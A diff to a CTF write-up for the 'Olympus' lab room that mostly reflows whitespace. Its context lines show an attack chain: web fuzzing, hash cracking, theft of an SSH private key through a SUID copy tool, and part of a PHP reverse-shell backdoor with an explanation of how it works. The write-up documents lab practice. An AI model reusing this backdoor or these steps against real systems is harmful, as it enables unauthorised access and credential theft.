@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -30,26 +30,26 @@ It says the old version of the website is still accessible on the domain, let's 
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.62.45 -H "Host: FUZZ.olympus.thm" -mc 200,301,302 -fs 0 -t 100 -ic -c
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.62.45
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- :: Header           : Host: FUZZ.olympus.thm
+ :: Method : GET
+ :: URL : http://10.10.62.45
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header : Host: FUZZ.olympus.thm
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200,301,302
- :: Filter           : Response size: 0
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 100
+ :: Matcher : Response status: 200,301,302
+ :: Filter : Response size: 0
 ________________________________________________
 ```
 
@@ -58,33 +58,33 @@ No subdomains were found on the scan, let's fuzz hidden directories using `dirb`
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://olympus.thm/FUZZ" -ic -c -t 200 -e .php,.html,.git
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://olympus.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .html .git
+ :: Method : GET
+ :: URL : http://olympus.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .php .html .git
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
-.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
-index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 190ms]
-static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 184ms]
-javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 184ms]
-phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 182ms]
+.html [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
+.php [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 189ms]
+index.php [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 190ms]
+static [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 184ms]
+javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 184ms]
+phpmyadmin [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 182ms]
 ```
 
 
@@ -96,7 +96,7 @@ DIRB v2.22
 By The Dark Raver
 -----------------
 
-START_TIME: Thu May  1 18:35:23 2025
+START_TIME: Thu May 1 18:35:23 2025
 URL_BASE: http://olympus.thm/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
@@ -170,7 +170,7 @@ EOF
 
 ```
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
-summertime       (prometheus)
+summertime (prometheus)
 ```
 
 We got credentials for `prometheus`, let's go inside the admin panel:
@@ -199,29 +199,29 @@ Since there needs to be an `uploads` directory, we need to fuzz to check if it w
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://chat.olympus.thm/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://chat.olympus.thm/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://chat.olympus.thm/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-static                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 204ms]
-javascript              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 191ms]
-uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 182ms]
+static [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 204ms]
+javascript [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 191ms]
+uploads [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 182ms]
 ```
 
 Here it is, if we remember the dump, we got a file in it, let's try to read it:
@@ -295,11 +295,11 @@ We got a binary called `cputils`, let's use it and check what it does:
 
 ```
 www-data@olympus:/tmp$ cputils
-  ____ ____        _   _ _
- / ___|  _ \ _   _| |_(_) |___
-| |   | |_) | | | | __| | / __|
-| |___|  __/| |_| | |_| | \__ \
- \____|_|    \__,_|\__|_|_|___/
+ ____ ____ _ _ _
+ / ___| _ \ _ _| |_(_) |___
+| | | |_) | | | | __| | / __|
+| |___| __/| |_| | |_| | \__ \
+ \____|_| \__,_|\__|_|_|___/
 
 Enter the Name of Source File: .
 
@@ -312,11 +312,11 @@ Seems like it simply copies files, let's copy `zeus` `id_rsa`:
 
 ```
 www-data@olympus:/tmp$ cputils
-  ____ ____        _   _ _
- / ___|  _ \ _   _| |_(_) |___
-| |   | |_) | | | | __| | / __|
-| |___|  __/| |_| | |_| | \__ \
- \____|_|    \__,_|\__|_|_|___/
+ ____ ____ _ _ _
+ / ___| _ \ _ _| |_(_) |___
+| | | |_) | | | | __| | / __|
+| |___| __/| |_| | |_| | \__ \
+ \____|_| \__,_|\__|_|_|___/
 
 Enter the Name of Source File: /home/zeus/.ssh/id_rsa
 
@@ -358,11 +358,11 @@ If we go to `/var/www/html`, we can notice this:
 ```
 zeus@olympus:/var/www/html$ ls -la
 total 28
-drwxr-xr-x 3 www-data www-data  4096 May  1  2022 .
-drwxr-xr-x 5 root     root      4096 Mar 22  2022 ..
-drwxrwx--x 2 root     zeus      4096 Jul 15  2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc
--rwxr-xr-x 1 root     root     10988 Apr 18  2022 index.html.old
--rwxr-xr-x 1 root     root        57 Apr 18  2022 index.php
+drwxr-xr-x 3 www-data www-data 4096 May 1 2022 .
+drwxr-xr-x 5 root root 4096 Mar 22 2022 ..
+drwxrwx--x 2 root zeus 4096 Jul 15 2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc
+-rwxr-xr-x 1 root root 10988 Apr 18 2022 index.html.old
+-rwxr-xr-x 1 root root 57 Apr 18 2022 index.php
 ```
 
 We got a weird directory:
@@ -370,10 +370,10 @@ We got a weird directory:
 ```
 zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
 total 12
-drwxrwx--x 2 root     zeus     4096 Jul 15  2022 .
-drwxr-xr-x 3 www-data www-data 4096 May  1  2022 ..
--rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
--rwxr-xr-x 1 root     zeus     1589 Jul 15  2022 VIGQFQFMYOST.php
+drwxrwx--x 2 root zeus 4096 Jul 15 2022 .
+drwxr-xr-x 3 www-data www-data 4096 May 1 2022 ..
+-rwxr-xr-x 1 root zeus 0 Apr 14 2022 index.html
+-rwxr-xr-x 1 root zeus 1589 Jul 15 2022 VIGQFQFMYOST.php
 ```
 
 Let's read the file:
@@ -410,12 +410,12 @@ stream_set_blocking($sock, 0);
 
 while(1)
 {
-    if(feof($sock) || feof($pipes[1])) break;
-    $read_a = array($sock, $pipes[1], $pipes[2]);
-    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
-    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
-    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
+ if(feof($sock) || feof($pipes[1])) break;
+ $read_a = array($sock, $pipes[1], $pipes[2]);
+ $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+ if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
+ if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
+ if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
 }
 
 fclose($sock);
@@ -424,7 +424,7 @@ proc_close($proc);
 ?>
 ```
 
-This PHP script is an authenticated reverse shell backdoor that provides remote system access when triggered with specific parameters. After verifying a hardcoded MD5 password via POST, it executes a reverse shell connection to an attacker-controlled IP/port specified in GET parameters (`?ip=X&port=Y`). The criticalÂ `$shell`Â variable executesÂ `uname -a; w; /lib/defended/libc.so.99`Â - first running system reconnaissance commands, then executing a hidden SUID binary (`libc.so.99`) likely designed for privilege escalation.
+This PHP script is an authenticated reverse shell backdoor that provides remote system access when triggered with specific parameters. After verifying a hardcoded MD5 password via POST, it executes a reverse shell connection to an attacker-controlled IP/port specified in GET parameters (`?ip=X&port=Y`). The critical`$shell` variable executes`uname -a; w; /lib/defended/libc.so.99` - first running system reconnaissance commands, then executing a hidden SUID binary (`libc.so.99`) likely designed for privilege escalation.
 
 So, in order to get a shell as root, we can do this:
 
